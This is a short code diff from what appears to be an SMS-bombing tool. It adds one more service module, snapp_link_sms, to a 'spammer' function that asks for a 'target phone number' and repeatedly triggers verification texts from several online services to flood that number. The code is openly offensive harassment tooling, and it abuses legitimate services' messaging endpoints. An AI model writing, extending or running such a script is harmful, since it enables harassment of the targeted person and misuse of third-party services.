@@ -27,6 +27,7 @@ from snapp_market_api import snapp_market_sms
 from bani_mode_api import bani_mode_sms
 from gap_api import gap
 from ali_baba_api import ali_baba
+from snapp_link_api import snapp_link_sms
 
 phone_number = input("Enter target phone number (example : 9XXXXXXXXXXX) : ")
 # schedule_time = input("Enter schedule time (example : 2022-02-02 13:00:00) : ")
@@ -81,3 +82,4 @@ def spammer(phone=phone_number, schedule=start_date, end_schedule=end_date):
         bani_mode_sms(phone)
         gap(phone)
         ali_baba(phone)
+        snapp_link_sms(phone)
